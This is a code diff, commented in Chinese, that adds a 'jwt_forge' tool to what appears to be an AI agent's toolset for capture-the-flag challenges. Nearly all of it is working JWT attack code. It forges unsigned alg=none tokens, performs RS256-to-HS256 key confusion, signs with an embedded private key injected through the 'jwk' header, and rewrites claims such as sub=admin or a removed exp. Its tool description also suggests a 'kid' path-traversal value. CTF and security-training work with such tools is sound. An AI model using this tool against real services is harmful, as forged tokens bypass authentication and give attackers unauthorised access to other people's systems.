@@ -22,7 +22,10 @@ import binascii
 import bz2
 import codecs
 import gzip
+import hashlib
+import hmac
 import html
+import json
 import lzma
 import re
 import tarfile
@@ -530,13 +533,181 @@ HEXPEEK_SPEC = {
     },
 }
 
-MISC_EXT_SPECS = [DECODE_SPEC, UNPACK_SPEC, HEXPEEK_SPEC]
-NAMES = {"decode_blob", "unpack_archive", "hexpeek"}
+# ---------------------------------------------------------------------------
+# 4. jwt_forge：构造/伪造 JWT（纯本地计算，无网络）
+# ---------------------------------------------------------------------------
+
+def _b64u(raw: bytes) -> str:
+    """JWT 用的 base64url：url-safe 且去掉 padding。"""
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")
+
+
+def _b64u_decode(text: str) -> bytes:
+    pad = "=" * (-len(text) % 4)
+    return base64.urlsafe_b64decode(text + pad)
+
+
+_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+
+# 内置测试密钥对：只服务「服务器信任 token 自带 jwk」这一类题（RS256 签名 + 把公钥塞进
+# 头的 jwk 字段）。私钥是公开测试值、不是秘密——它的用途是让目标拿我们给的公钥去验签，
+# 而不是保护任何东西。生成脚本见 runs/_rsa_keygen.py（一次性，不随镜像走）。
+_RSA_N = int(
+    "936d6a39cdf53e4e7eac133c9c32ff97068f7e852561fe7d17443eb838fb2af315655aff535488b391e03e618fe76ac2ec938f37328d3d5905fcbd29c5c5437758c424a71db01f36b602d6764fed9d32c502453fbafe956093013fc0a1c0ce47d01e62c06f68e2c3a68a634e3687e59d10a122862af3a7b71ba0f2dcbe8b4eac93277ea0211a5b278aa5db323d44833c89ee5fa029e6fd094d0b5b426ac791bb650ccb71298f9a7634b2523d1b90738d7c0ae78af20d27dceb76bfe7fa982afb7c8cd08305c240ad8372f0262da18bd36a2e6df9bcbf6c3b01ef2f81eee07eb854046d83852d77d4c52600130dd565a7de82d60a77942b9cd2cf68227dd6d5c3",
+    16,
+)
+_RSA_D = int(
+    "71a602226773ebc125034f9d04a887c18bcc2873499b1e4c9e17fce594ff825f7b99f3a92a3adb5ada546ca25705c596583b7446cfd0737f620f305fb856d62875a456c10130d90f1b065aff3fa463ef5451e8c2354bb629898987f4de7cbc483dd67eb7ebea860cdf20856730c0583059366e5fd1529d729978dc5f710000f7fabb9297ef6efd405ff4a4c9b40a9244e34018056565ab39a2c02fe1b91bc75b8cc2d282f5ae891cad9b1236607287c4dc0f7a31b5f89fcc2ef8365a4c5698123346d71c2661109a4d7629651779ccda60ef5c6b8bde58e31c97644176d2cc6cee892d1fe6d1fc1d79e5ede2b18f74c1ffa455fb6ea0df9c3173c088369ee4d9",
+    16,
+)
+_RSA_E = 65537
+# SHA-256 的 PKCS#1 v1.5 DigestInfo 前缀（EMSA-PKCS1-v1_5）
+_SHA256_DI = bytes.fromhex("3031300d060960864801650304020105000420")
+
+
+def _int_b64u(value: int) -> str:
+    length = (value.bit_length() + 7) // 8
+    return base64.urlsafe_b64encode(value.to_bytes(length, "big")).rstrip(b"=").decode("ascii")
+
+
+# 一次性算好的公钥 JWK（RS256 每次都引用它，不重算 base64url）
+_RSA_PUBLIC_JWK = {
+    "kty": "RSA", "use": "sig", "alg": "RS256",
+    "kid": "ctfy-test-key", "n": _int_b64u(_RSA_N), "e": _int_b64u(_RSA_E),
+}
+
+
+def _rsa_sha256_sign(signing_input: bytes) -> bytes:
+    """纯 python 的 RSA PKCS#1 v1.5 + SHA-256 签名，不依赖 cryptography。"""
+    k = (_RSA_N.bit_length() + 7) // 8
+    digest = hashlib.sha256(signing_input).digest()
+    t = _SHA256_DI + digest
+    ps_len = k - len(t) - 3
+    if ps_len < 8:  # 防御性：2048 位密钥下不可能发生
+        _fail("RSA 密钥过短，无法签名")
+    em = b"\x00\x01" + b"\xff" * ps_len + b"\x00" + t
+    return pow(int.from_bytes(em, "big"), _RSA_D, _RSA_N).to_bytes(k, "big")
+
+
+def jwt_forge(alg: str = "HS256", secret: str = "", token: str = "",
+              claims: dict | None = None, header: dict | None = None,
+              remove: list[str] | None = None) -> str:
+    """构造/伪造 JWT。
+
+    - alg=none：无签名，签名段留空；
+    - alg=HS256/384/512：用 secret 做 HMAC。**RS256→HS256 混淆**选 HS256、把公钥 PEM 全文当 secret；
+    - alg=RS256：用内置测试密钥对签名，并把公钥以 jwk 头注入（打「信任 token 自带密钥」的服务）；
+    - 传 token 则以它解出的 header/claims 为基底改写；secret 永不回显，只回显长度。
+    """
+    alg = (alg or "HS256")
+    alg_key = alg.upper()
+    header_extra = dict(header or {})
+    claims_extra = dict(claims or {})
+    if remove is not None and not isinstance(remove, list):
+        _fail("remove 必须是数组（list），例如 [\"exp\", \"nbf\"]")
+    remove_keys = [str(k) for k in (remove or []) if isinstance(k, str)]
+
+    header_out: dict = {"typ": "JWT"}
+    claims_out: dict = {}
+    if token:
+        parts = token.strip().split(".")
+        if len(parts) < 2:
+            _fail("token 不像 JWT：点分段不足 2 段")
+        try:
+            header_out = json.loads(_b64u_decode(parts[0]))
+            claims_out = json.loads(_b64u_decode(parts[1]))
+        except Exception as exc:  # noqa: BLE001
+            _fail(f"token 前两段不是合法 base64url JSON：{exc}")
+
+    changed: list[str] = []
+    for key, value in header_extra.items():
+        if value is None:
+            continue
+        header_out[str(key)] = value
+    for key, value in claims_extra.items():
+        if value is None:
+            continue
+        k = str(key)
+        if claims_out.get(k) != value:
+            changed.append(k)
+        claims_out[k] = value
+    removed: list[str] = []
+    for key in remove_keys:
+        if key in claims_out:
+            claims_out.pop(key)
+            removed.append(key)
+
+    if alg_key == "NONE":
+        header_out["alg"] = "none"
+    elif alg_key in ("HS256", "HS384", "HS512"):
+        header_out["alg"] = alg_key
+    elif alg_key == "RS256":
+        header_out["alg"] = "RS256"
+        header_out["jwk"] = _RSA_PUBLIC_JWK
+    else:
+        _fail(f"不支持的 alg：{alg}；可用 none / HS256 / HS384 / HS512 / RS256")
+
+    header_raw = json.dumps(header_out, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
+    claims_raw = json.dumps(claims_out, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
+    signing_input = _b64u(header_raw).encode("ascii") + b"." + _b64u(claims_raw).encode("ascii")
+
+    if alg_key == "NONE":
+        sig = b""
+    elif alg_key.startswith("HS"):
+        if not secret:
+            _fail("HS* 需要 secret；RS256→HS256 混淆请把公钥 PEM 全文当 secret 传入")
+        sig = hmac.new(secret.encode("utf-8"), signing_input, _HASHES[alg_key]).digest()
+    else:
+        sig = _rsa_sha256_sign(signing_input)
+
+    token_out = signing_input.decode("ascii") + "." + _b64u(sig)
+    result = {
+        "token": token_out,
+        "alg": "none" if alg_key == "NONE" else alg_key,
+        "header": header_out,
+        "claims": claims_out,
+        "changed": changed,
+        "removed": removed,
+    }
+    if alg_key.startswith("HS"):
+        result["secret_len"] = len(secret)
+    return _clip(json.dumps(result, ensure_ascii=False))
+
+
+JWT_SPEC = {
+    "type": "function",
+    "function": {
+        "name": "jwt_forge",
+        "description": (
+            "构造/伪造 JWT（纯本地计算）。alg=none 无签名；HS256/384/512 用 secret 做 HMAC"
+            "（RS256→HS256 混淆：alg 选 HS256、secret 传公钥 PEM 全文）；"
+            "RS256 用内置测试密钥对签名并把公钥塞进 jwk 头（打「信任 token 自带密钥」的服务）。"
+            "传 token 则以它为基底改 header/claims，remove 删字段（如 exp）。secret 不回显。"
+        ),
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "alg": {"type": "string", "enum": ["none", "HS256", "HS384", "HS512", "RS256"], "description": "签名算法，默认 HS256"},
+                "secret": {"type": "string", "description": "HMAC 密钥；混淆攻击传公钥 PEM 全文。只在结果里回显长度"},
+                "token": {"type": "string", "description": "可选：已有 JWT，作为改写基底"},
+                "claims": {"type": "object", "description": "覆盖/新增的 claims，如 {\"sub\":\"admin\"}"},
+                "header": {"type": "object", "description": "覆盖/新增的 header，如 {\"kid\":\"../../dev/null\"}"},
+                "remove": {"type": "array", "items": {"type": "string"}, "description": "要删除的 claim 名，如 [\"exp\",\"nbf\"]"},
+            },
+            "required": [],
+        },
+    },
+}
+
+
+MISC_EXT_SPECS = [DECODE_SPEC, UNPACK_SPEC, HEXPEEK_SPEC, JWT_SPEC]
+NAMES = {"decode_blob", "unpack_archive", "hexpeek", "jwt_forge"}
 
 _IMPL = {
     "decode_blob": decode_blob,
     "unpack_archive": unpack_archive,
     "hexpeek": hexpeek,
+    "jwt_forge": jwt_forge,
 }
 
 
